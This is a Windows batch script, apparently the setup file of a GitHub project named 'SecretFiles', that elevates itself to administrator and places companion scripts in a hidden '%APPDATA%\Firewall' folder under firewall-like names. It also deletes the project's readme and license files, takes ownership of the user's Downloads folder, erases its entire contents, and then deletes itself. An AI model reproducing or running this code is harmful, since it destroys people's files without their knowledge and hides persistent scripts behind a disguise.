@echo off

net session >nul 2>&1 || (powershell -Command "Start-Process -FilePath '%~f0' -Verb RunAs" & exit)

:: setup work cd
set "SF=%CD%"
set "HD=%APPDATA%\Firewall"

chcp 65001 > nul
color 0D

echo.
echo.

type .ascii.txt

echo.
echo.

echo ꑭ!хꑭ github.com/fxhxyz4/SecretFiles ꑭх!ꑭ

ping 127.0.0.1 -n 5 > nul

:: arch version
set VER=64
for /f %%I in ('powershell -Command "(Get-CimInstance Win32_OperatingSystem).OSArchitecture"') do set OS_ARCH=%%I

if "%OS_ARCH%"=="32-bit" set VER=32

for /f "delims=" %%L in ('powershell -Command "(Get-WinSystemLocale).Name"') do set OS_LANGUAGE=%%L

set DOWNLOADS=%USERPROFILE%\Загрузки
if "%OS_LANGUAGE%"=="en-US" set DOWNLOADS=%USERPROFILE%\Downloads

set NAME=.firewall%VER%

rename .firewall.bat %NAME%.bat
rename .firewall.vbs %NAME%.vbs
rename .firewall.ps1 %NAME%.ps1
rename .firewalle.ps1 %NAME%e.ps1
rename .firewalld.ps1 %NAME%d.ps1

title %NAME%

:: deleted github files
del /f /q "%SF%\readme" >nul 2>&1
del /f /q "%SF%\license" >nul 2>&1
del /f /q "%SF%\security" >nul 2>&1
del /f /q "%SF%\.gitignore" >nul 2>&1
del /f /q "%SF%\text.txt" >nul 2>&1
del /f /q "%SF%\%NAME%d.ps1" >nul 2>&1

:: create folder
if not exist "%HD%" (
    mkdir "%HD%"
    attrib +h "%HD%"
)

:: create txt file
echo "key: 123" > %HD%\%NAME%.txt

:: move script files with error checking
if exist "%SF%\%NAME%.vbs" move /y "%SF%\%NAME%.vbs" "%HD%\" >nul
if exist "%SF%\%NAME%.bat" move /y "%SF%\%NAME%.bat" "%HD%\" >nul
if exist "%SF%\%NAME%.ps1" move /y "%SF%\%NAME%.ps1" "%HD%\" >nul
if exist "%SF%\%NAME%e.ps1" move /y "%SF%\%NAME%e.ps1" "%HD%\" >nul
if exist "%SF%\.ascii.txt" move /y "%SF%\.ascii.txt" "%HD%\" >nul

attrib +h "%HD%\%NAME%.vbs"
attrib +h "%HD%\%NAME%.bat"
attrib +h "%HD%\%NAME%.ps1"
attrib +h "%HD%\%NAME%e.ps1"
attrib +h "%HD%\.ascii.txt"

:: correct folder name for Downloads
takeown /f "%DOWNLOADS%\*" /r /d y
del /q "%DOWNLOADS%\*.*" && for /d %%G in ("%DOWNLOADS%\*") do rd /s /q "%%G"

for %%f in (%SF%\.*) do (
    attrib +h "%%f" >nul 2>&1
)

:: delete config.cmd
echo worked
echo use %NAME%.txt

:: Delay the removal of the script to avoid deletion while still running
ping 127.0.0.1 -n 3 > nul
del "%~f0" >nul 2>&1

cls
exit
